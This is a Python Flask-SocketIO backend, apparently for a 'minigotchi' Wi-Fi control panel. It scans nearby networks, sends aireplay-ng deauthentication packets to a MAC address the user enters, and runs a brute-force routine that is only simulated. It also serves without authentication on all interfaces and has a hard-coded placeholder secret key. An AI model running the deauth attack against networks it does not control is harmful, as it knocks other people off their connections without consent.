import eventlet
eventlet.monkey_patch()

from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import psutil
import subprocess
import threading
import time
import logging
import re

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('minigotchi')

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'  # Change this for production
socketio = SocketIO(app, async_mode='eventlet')

# Global variables to hold scan and attack threads
scan_thread = None
brute_thread = None
deauth_thread = None

# Lock for concurrency control
thread_lock = threading.Lock()


@app.route('/')
def index():
    return render_template('index.html')


def scan_networks():
    """
    Perform WiFi scan using `iwlist` or other command.
    Parse results and emit via socketio.
    """
    try:
        # Execute system command to scan WiFi networks
        # Adjust interface name if needed, e.g., wlan0
        cmd = ['sudo', 'iwlist', 'wlan0', 'scan']
        scan_output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode('utf-8')
        networks = parse_scan_output(scan_output)
        logger.info(f"Scan found {len(networks)} networks")
        socketio.emit('scan_results', {'networks': networks})
    except Exception as e:
        logger.error(f"Error scanning networks: {e}")
        socketio.emit('scan_results', {'networks': []})


def parse_scan_output(output):
    """
    Parses iwlist scan output to extract SSID, BSSID, and Signal level
    """
    networks = []
    cells = re.split(r'Cell \d+ - ', output)
    for cell in cells[1:]:  # Skip first split part
        ssid_match = re.search(r'ESSID:"([^"]+)"', cell)
        bssid_match = re.search(r'Address: ([\da-fA-F:]{17})', cell)
        signal_match = re.search(r'Signal level=(-?\d+) dBm', cell)
        if ssid_match and bssid_match and signal_match:
            ssid = ssid_match.group(1)
            bssid = bssid_match.group(1)
            signal = int(signal_match.group(1))
            networks.append({'ssid': ssid, 'bssid': bssid, 'signal': signal})
    return networks


def run_deauth(target_mac, count=10):
    """
    Sends deauth packets to the target using aireplay-ng or similar.
    Requires root privileges and a compatible WiFi adapter in monitor mode.
    """
    try:
        # Here, we use aireplay-ng command. Adjust interface as needed.
        interface = 'wlan0mon'  # Must be monitor mode interface
        cmd = ['sudo', 'aireplay-ng', '--deauth', str(count), '-a', target_mac, interface]
        logger.info(f"Running deauth attack on {target_mac}")
        subprocess.check_output(cmd, stderr=subprocess.STDOUT)
        socketio.emit('deauth_status', {'status': f'Deauth packets sent to {target_mac}', 'success': True})
    except subprocess.CalledProcessError as e:
        logger.error(f"Deauth command failed: {e.output.decode('utf-8')}")
        socketio.emit('deauth_status', {'status': 'Deauth attack failed', 'success': False})
    except Exception as e:
        logger.error(f"Unexpected error in deauth: {e}")
        socketio.emit('deauth_status', {'status': 'Deauth attack error', 'success': False})


def run_brute(target_ssid):
    """
    Simulated brute force attack for demonstration.
    Real brute forcing requires password lists and additional tools.
    This example just waits and returns success/failure messages.
    """
    try:
        logger.info(f"Starting brute force on {target_ssid}")
        for i in range(1, 6):
            time.sleep(2)
            socketio.emit('brute_status', {'status': f'Brute forcing {target_ssid}... attempt {i}', 'success': True})
        socketio.emit('brute_status', {'status': f'Brute force completed for {target_ssid}', 'success': True})
    except Exception as e:
        logger.error(f"Error in brute force: {e}")
        socketio.emit('brute_status', {'status': 'Brute force attack error', 'success': False})


def send_periodic_status():
    """
    Periodically sends system status updates every 3 seconds.
    Includes CPU %, memory %, and dummy packets per second (pps).
    """
    while True:
        cpu = psutil.cpu_percent(interval=None)
        memory = psutil.virtual_memory().percent
        # For packets per second, simulate or get from pwnagotchi API or network stats
        pps = get_packets_per_second()

        socketio.emit('status_update', {'cpu': cpu, 'memory': memory, 'pps': pps})
        socketio.sleep(3)


def get_packets_per_second():
    """
    Get packets per second from interface statistics.
    Example for Linux interface 'wlan0'.
    """
    try:
        net_io_1 = psutil.net_io_counters(pernic=True).get('wlan0', None)
        if not net_io_1:
            return 0
        time.sleep(1)
        net_io_2 = psutil.net_io_counters(pernic=True).get('wlan0', None)
        if not net_io_2:
            return 0
        packets_1 = net_io_1.packets_sent + net_io_1.packets_recv
        packets_2 = net_io_2.packets_sent + net_io_2.packets_recv
        return packets_2 - packets_1
    except Exception as e:
        logger.error(f"Error getting packets per second: {e}")
        return 0


@socketio.on('start_scan')
def handle_start_scan():
    global scan_thread
    with thread_lock:
        if scan_thread is None or not scan_thread.is_alive():
            logger.info("Received start_scan event")
            scan_thread = socketio.start_background_task(target=scan_networks)
        else:
            logger.info("Scan already running, ignoring start_scan event")


@socketio.on('send_deauth')
def handle_send_deauth(data):
    target = data.get('target', '').strip()
    if not target:
        emit('deauth_status', {'status': 'No target specified', 'success': False})
        return

    global deauth_thread
    with thread_lock:
        if deauth_thread is None or not deauth_thread.is_alive():
            logger.info(f"Received send_deauth event for target: {target}")
            deauth_thread = socketio.start_background_task(target=run_deauth, target_mac=target)
        else:
            emit('deauth_status', {'status': 'Deauth attack already in progress', 'success': False})


@socketio.on('start_brute')
def handle_start_brute(data):
    target = data.get('target', '').strip()
    if not target:
        emit('brute_status', {'status': 'No target specified', 'success': False})
        return

    global brute_thread
    with thread_lock:
        if brute_thread is None or not brute_thread.is_alive():
            logger.info(f"Received start_brute event for target: {target}")
            brute_thread = socketio.start_background_task(target=run_brute, target_ssid=target)
        else:
            emit('brute_status', {'status': 'Brute force attack already in progress', 'success': False})


if __name__ == '__main__':
    # Start periodic status updates background task
    socketio.start_background_task(target=send_periodic_status)

    # Run Flask-SocketIO server, accessible to local network
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)